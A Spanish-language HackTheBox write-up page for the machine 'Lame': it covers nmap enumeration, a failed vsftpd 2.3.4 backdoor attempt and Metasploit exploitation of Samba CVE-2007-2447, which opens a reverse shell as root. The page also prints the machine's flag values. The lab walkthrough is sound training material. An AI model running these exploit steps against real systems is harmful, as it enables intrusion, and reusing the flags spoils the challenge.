+        <div><span class="o-orange">139/tcp&nbsp; open&nbsp; netbios-ssn&nbsp; Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></div>
+        <div><span class="o-orange">445/tcp&nbsp; open&nbsp; netbios-ssn&nbsp; Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span></div>
+        <div>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Host script results:</div>
+        <div>| smb-os-discovery:</div>
+        <div>|&nbsp;&nbsp; OS: Unix (Samba 3.0.20-Debian)</div>
+        <div>|&nbsp;&nbsp; Computer name: lame</div>
+        <div>|&nbsp;&nbsp; Domain name: hackthebox.gr</div>
+        <div>|&nbsp;&nbsp; FQDN: lame.hackthebox.gr</div>
+        <div>|_  message_signing: disabled (dangerous, but default)</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- VSFTPD — FALSA PISTA -->
+    <div class="section" id="vsftpd">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">vsftpd 2.3.4 — La Falsa Pista</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          La versión <span class="hl-red">vsftpd 2.3.4</span> es famosa por contener un
+          <strong>backdoor</strong> malicioso introducido en junio de 2011. Se activa enviando
+          un nombre de usuario terminado en <span class="hl-yel">":)"</span>, que abre un
+          listener en el puerto 6200. Metasploit tiene un módulo específico para esto.
+        </p>
+        <p>
+          Sin embargo, en Lame <strong>el backdoor está bloqueado</strong> y no funciona. El
+          exploit completa sin crear sesión. Es una lección importante: no toda vulnerabilidad
+          conocida es explotable en todos los entornos.
+        </p>
+      </div>
+
+      <div class="warn-box">
+        <div class="warn-box-title">// RABBIT HOLE — BACKDOOR BLOQUEADO</div>
+        <p>El exploit <strong>vsftpd_234_backdoor</strong> retorna <code>Exploit completed, but no session was created</code>.
+        El firewall o configuración de la máquina bloquea el puerto 6200 donde debería abrir el listener.
+        Ignoramos este vector y continuamos con Samba.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">INTENTO CON METASPLOIT — vsftpd BACKDOOR</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="msfconsole">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">$ </span><span class="cmd">msfconsole</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="search vsftpd 2.3.4">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="msf-prompt">msf6 &gt; </span><span class="cmd">search <span class="arg">vsftpd 2.3.4</span></span></div>
+        <div><span class="msf-prompt">msf6 &gt; </span><span class="cmd">use <span class="arg">0</span></span></div>
+        <div><span class="msf-prompt">msf6 exploit(...) &gt; </span><span class="cmd">set RHOSTS <span class="arg">10.10.10.3</span></span></div>
+        <div><span class="msf-prompt">msf6 exploit(...) &gt; </span><span class="cmd">exploit</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)</div>
+        <div>[*] 10.10.10.3:21 - USER: 331 Please specify the password.</div>
+        <div><span class="o-red">[*] Exploit completed, but no session was created.</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SAMBA -->
+    <div class="section" id="samba">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Enumeración Samba</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Pivotamos hacia el servicio <span class="hl-ora">Samba</span>. El escaneo Nmap ya reveló
+          la versión <strong>3.0.20-Debian</strong>, que es vulnerable al
+          <span class="hl-red">CVE-2007-2447</span>. Antes de explotar, enumeramos los recursos
+          compartidos con <span class="hl-cyan">smbmap</span> y nos conectamos manualmente con
+          <span class="hl-cyan">smbclient</span>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ENUMERACIÓN DE RECURSOS — SMBMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          <code style="color:var(--cyan)">smbmap</code> enumera los recursos compartidos y
+          sus permisos. Identificamos que el share <span class="hl-yel">tmp</span> tiene
+          permisos de <strong>READ, WRITE</strong>, lo que confirma acceso anónimo amplio.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="smbmap -H 10.10.10.3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SMBMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">smbmap <span class="flag">-H</span> <span class="arg">10.10.10.3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[+] IP: 10.10.10.3:445&nbsp;&nbsp; Name: 10.10.10.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Status: Authenticated</div>
+        <div>&nbsp;</div>
+        <div>Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Permissions&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Comment</div>
+        <div>----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -------</div>
+        <div>print$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO ACCESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Printer Drivers</div>
+        <div><span class="o-green">tmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; READ, WRITE</span>&nbsp;&nbsp;&nbsp;&nbsp; oh noes!</div>
+        <div>opt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO ACCESS</div>
+        <div>IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO ACCESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IPC Service (lame server (Samba 3.0.20-Debian))</div>
+        <div>ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO ACCESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IPC Service (lame server (Samba 3.0.20-Debian))</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONEXIÓN MANUAL — SMBCLIENT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Nos conectamos al share <code style="color:var(--yellow)">tmp</code> con
+          <span class="hl-cyan">smbclient</span> usando <code style="color:var(--cyan)">-N</code>
+          (sin credenciales, sesión anónima). Exploramos el contenido con <code>ls</code> y
+          comprobamos que tenemos acceso. Aunque vemos archivos interesantes como
+          <code>vmware-root</code>, el acceso está denegado. La información más valiosa ya la
+          tenemos: la versión de Samba.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="smbclient -N \\\\10.10.10.3\\tmp">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SMBCLIENT</span>
+        <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="flag">-N</span> <span class="arg">\\\\10.10.10.3\\tmp</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Anonymous login successful</div>
+        <div>Try "help" to get a list of possible commands.</div>
+        <div>smb: \&gt; ls</div>
+        <div>&nbsp;</div>
+        <div>&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 &nbsp; Sat Jun 21 21:04:35 2025</div>
+        <div>&nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 &nbsp; Sat Jun 21 15:44:55 2025</div>
+        <div>&nbsp;&nbsp;vmware-root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 &nbsp; Sat Jun 21 15:16:52 2025</div>
+        <div>&nbsp;&nbsp;<span class="o-yellow">vgauthsvclog.txt.0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1600&nbsp; Sat Jun 21 15:14:50 2025</div>
+        <div>&nbsp;</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7282168 blocks of size 1024. 5386276 blocks available</div>
+      </div>
+
+      <div class="cve-box">
+        <div class="cve-box-title">// CVE-2007-2447 — SAMBA USERNAME MAP SCRIPT</div>
+        <p><strong>Samba 3.0.20</strong> es vulnerable a ejecución remota de comandos cuando la
+        opción <code>"username map script"</code> está habilitada en <code>smb.conf</code>.
+        Un atacante puede inyectar metacaracteres shell en el campo de usuario durante la
+        autenticación, lo que ejecuta comandos arbitrarios con los privilegios del proceso Samba
+        (<strong>root</strong> en este caso). CVSS: 10.0 (Crítico).</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- EXPLOTACIÓN -->
+    <div class="section" id="explotacion">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Explotación — CVE-2007-2447</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Usamos el módulo de Metasploit <span class="hl-pur">exploit/multi/samba/usermap_script</span>
+          que explota el CVE-2007-2447. La clave es configurar correctamente el
+          <span class="hl-cyan">LHOST</span> con la IP de nuestra interfaz VPN (<code style="color:var(--yellow)">tun0</code>),
+          no la IP de la red local, ya que HackTheBox enruta el tráfico de vuelta a través de la VPN.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">BUSCAR Y CARGAR EL MÓDULO</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="search Samba 3.0.20">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="msf-prompt">msf6 &gt; </span><span class="cmd">search <span class="arg">Samba 3.0.20</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Matching Modules</div>
+        <div>================</div>
+        <div>&nbsp;</div>
+        <div>&nbsp;&nbsp; #&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disclosure Date&nbsp; Rank&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Check</div>
+        <div>&nbsp;&nbsp; -&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----</div>
+        <div>&nbsp;</div>
+        <div>&nbsp;&nbsp; <span class="o-green">0&nbsp; exploit/multi/samba/usermap_script&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2007-05-14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excellent&nbsp; No</span></div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp; Samba "username map script" Command Execution</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONFIGURAR Y EJECUTAR EL EXPLOIT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Seleccionamos el módulo, configuramos <strong>RHOSTS</strong> con la IP de la víctima
+          y <strong>LHOST</strong> con la IP de nuestra VPN. Este es el paso crítico donde muchos
+          fallan al poner la IP local en lugar de la de la interfaz <span class="hl-cyan">tun0</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="use 0">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="msf-prompt">msf6 &gt; </span><span class="cmd">use <span class="arg">0</span></span></div>
+        <div><span class="msf-prompt">msf6 exploit(multi/samba/usermap_script) &gt; </span><span class="cmd">set RHOSTS <span class="arg">10.10.10.3</span></span></div>
+        <div><span class="msf-prompt">msf6 exploit(multi/samba/usermap_script) &gt; </span><span class="cmd">set LHOST <span class="arg">10.10.14.246</span> <span class="comment"># IP tun0 (VPN)</span></span></div>
+        <div><span class="msf-prompt">msf6 exploit(multi/samba/usermap_script) &gt; </span><span class="cmd">exploit</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[*] Started reverse TCP handler on <span class="o-cyan">10.10.14.246:4444</span></div>
+        <div><span class="o-green">[*] Command shell session 1 opened (10.10.14.246:4444 → 10.10.10.3:43808) at 2025-06-21 22:43:25 -0400</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">whoami</span></div>
+        <div><span class="o-red">root</span></div>
+      </div>
+
+      <div class="info-box">
+        <div class="info-box-title">// SHELL DIRECTA COMO ROOT</div>
+        <p>El exploit CVE-2007-2447 entrega una shell directamente como <strong>root</strong>.
+        No hay escalada de privilegios necesaria — Samba corría con permisos de superusuario
+        en esta versión vulnerable. Desde aquí tenemos acceso completo al sistema.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FLAGS -->
+    <div class="section" id="flags">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Flags</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Con shell como <strong>root</strong>, navegamos al directorio <code style="color:var(--yellow)">/root</code>
+          para la flag de root, y a <code style="color:var(--yellow)">/home/makis</code>
+          para la flag de usuario.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ROOT FLAG</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd /root && cat root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SHELL</span>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">/root</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">ls</span></div>
+        <div><span class="comment"># Desktop  reset_logs.sh  root.txt  vnc.log</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">root.txt</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">USER FLAG</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd /home/makis && cat user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SHELL</span>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">/home</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">ls</span></div>
+        <div><span class="comment"># ftp  makis  service  user</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">makis</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">user.txt</span></span></div>
+      </div>
+
+      <div class="flags-grid">
+        <div class="flag-card">
+          <div class="flag-label">// USER FLAG — /home/makis/user.txt</div>
+          <div class="flag-user">f21153c45bce4606d7c3c9c5263ce60a</div>
+        </div>
+        <div class="flag-root-card">
+          <div class="flag-label">// ROOT FLAG — /root/root.txt</div>
+          <div class="flag-root">86e620165496bd3a51c91192394b7ff6</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA DE COMANDOS -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p21,22,139,445 -sCV -Pn [IP]</div>
+          <div class="cmd-ref-desc">Escaneo de puertos con detección de versiones y scripts NSE, sin ping previo.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-Pn</span> — No hacer ping (tratar host como activo)</li>
+            <li><span>-sC</span> — Ejecutar scripts NSE por defecto</li>
+            <li><span>-sV</span> — Detectar versiones de servicios</li>
+            <li><span>-p</span> — Especificar puertos concretos</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">smbmap</div>
+          <div class="cmd-ref-syntax">smbmap -H [IP]</div>
+          <div class="cmd-ref-desc">Enumera recursos compartidos SMB y los permisos del usuario anónimo sobre cada uno.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-H</span> — Host/IP objetivo</li>
+            <li><span>-u</span> — Usuario (vacío = anónimo)</li>
+            <li><span>-p</span> — Puerto SMB (default 445)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">smbclient</div>
+          <div class="cmd-ref-syntax">smbclient -N \\\\IP\\share</div>
+          <div class="cmd-ref-desc">Cliente SMB de línea de comandos, similar a FTP. Permite navegar y descargar archivos de shares.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-N</span> — Sin contraseña (anónimo)</li>
+            <li><span>-L</span> — Listar shares disponibles</li>
+            <li><span>get</span> — Descargar archivo del share</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Metasploit</div>
+          <div class="cmd-ref-syntax">exploit/multi/samba/usermap_script</div>
+          <div class="cmd-ref-desc">Módulo que explota CVE-2007-2447 inyectando metacaracteres shell en el campo username de Samba.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>RHOSTS</span> — IP de la víctima</li>
+            <li><span>LHOST</span> — IP VPN tun0 (¡no la local!)</li>
+            <li><span>RPORT</span> — Puerto SMB (default 139)</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">TTL — Time To Live</div>
+          <div class="glos-def">El <strong>TTL</strong> es un valor en los paquetes de red que indica cuántos saltos (routers) puede dar antes de ser descartado. Se usa para identificar el sistema operativo: <code>Linux</code> usa TTL inicial de 64 (llega a 63 tras 1 salto), <code>Windows</code> usa 128 (llega a 127). Este fingerprinting pasivo evita ruido en la red.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SMB / Samba — Server Message Block</div>
+          <div class="glos-def"><strong>SMB</strong> es el protocolo de red de Microsoft para compartir archivos, impresoras y comunicación IPC entre sistemas. <strong>Samba</strong> es la implementación open-source de SMB para sistemas Unix/Linux. Opera en los puertos 139 (NetBIOS) y 445 (SMB directo sobre TCP). Es históricamente una fuente de vulnerabilidades críticas (EternalBlue, CVE-2007-2447, etc.).</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2007-2447 — Samba Username Map Script</div>
+          <div class="glos-def">Vulnerabilidad en <strong>Samba 3.0.0 a 3.0.25rc3</strong> que permite RCE cuando la opción <code>username map script</code> está configurada en <code>smb.conf</code>. El atacante inyecta metacaracteres shell (como <code>; comando</code>) en el nombre de usuario durante la autenticación MS-RPC. El proceso Samba ejecuta esos comandos con sus propios privilegios (root). CVSS Score: 10.0.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">vsftpd 2.3.4 — Backdoor</div>
+          <div class="glos-def">En junio de 2011, repositorios no oficiales distribuyeron una versión troyanizada de <strong>vsftpd 2.3.4</strong> con un backdoor. Se activaba enviando un usuario terminado en <code>:)</code> (ej. <code>user:)</code>), que abría un listener en el puerto <strong>6200</strong>. En Lame, aunque la versión es la vulnerable, el puerto está bloqueado por firewall, haciendo el exploit inútil.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Metasploit Framework</div>
+          <div class="glos-def"><strong>Metasploit</strong> es el framework de explotación más utilizado en pentesting. Organiza exploits, payloads y módulos auxiliares. El flujo básico es: <code>search [vuln]</code> → <code>use [módulo]</code> → <code>set RHOSTS [IP]</code> → <code>set LHOST [IP_VPN]</code> → <code>exploit</code>. El <strong>LHOST</strong> siempre debe ser la IP de la interfaz de red que puede recibir la conexión entrante de la víctima.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">smbmap — Enumeración SMB</div>
+          <div class="glos-def"><strong>smbmap</strong> es una herramienta especializada en enumerar recursos SMB y sus permisos. A diferencia de smbclient, muestra una tabla clara con todos los shares y si tienes acceso de lectura, escritura o ninguno. Es especialmente útil para identificar rápidamente shares accesibles sin credenciales (anónimo) y targets con permisos de escritura que podrían usarse para plantar payloads.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Rabbit Hole — Falsa Pista</div>
+          <div class="glos-def">En CTF y pentesting, un <strong>rabbit hole</strong> es una pista o vector que parece prometedor pero no lleva a ningún lado. En Lame, el backdoor de vsftpd 2.3.4 es el rabbit hole clásico: muchos principiantes gastan tiempo intentando explotarlo sin éxito porque está bloqueado. Reconocer cuándo abandonar un vector y pivotar a otro es una habilidad fundamental del pentester.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">LHOST vs RHOST — Metasploit</div>
+          <div class="glos-def"><strong>RHOST</strong> (Remote Host) es la IP de la máquina víctima que se va a atacar. <strong>LHOST</strong> (Local Host) es la IP del atacante donde se recibirá la reverse shell. En entornos como HackTheBox donde se usa VPN, el LHOST debe ser la IP de la interfaz <code>tun0</code> (asignada por la VPN), no la IP de la red local. Si se usa la IP incorrecta, el exploit ejecuta pero no puede enrutar la conexión de vuelta.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
